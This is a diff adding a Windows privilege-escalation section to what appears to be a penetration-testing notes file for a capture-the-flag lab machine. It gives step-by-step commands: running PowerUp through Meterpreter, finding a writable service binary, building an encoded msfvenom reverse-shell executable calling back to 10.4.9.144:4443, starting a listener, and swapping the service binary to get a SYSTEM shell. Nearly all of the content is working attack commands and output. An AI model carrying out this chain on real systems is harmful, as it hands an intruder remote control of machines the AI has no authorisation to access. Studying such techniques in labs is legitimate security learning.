@@ -380,6 +380,67 @@ powershell_shell
 Invoke-AllChecks
 ```
 
+## Windows Priv esc
+
+in meterpreter session upload powerup and execute scan
+
+```
+upload /home/kali/Documents/PowerUp.ps1
+load powershell
+powershell_shell
+. ./PowerUp.ps1
+Invoke-AllChecks
+```
+
+identified service that canRestart and modifiable
+```
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files
+
+```
+
+create reverse shell exe with msfvenom
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+```
+
+
+in meterpreter setup reverse windows tcp listener
+```
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set lhost 10.4.9.144
+set lport 4443
+run -j
+```
+
+stop service
+```
+sc stop AdvancedSystemCareService9
+```
+
+in meterpreter session, upload exe and copy into directory
+```
+upload ASCService.exe
+copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+```
+
+start service
+```
+sc start AdvancedSystemCareService9
+```
+
+
+
+
 ## CheckList
 
 
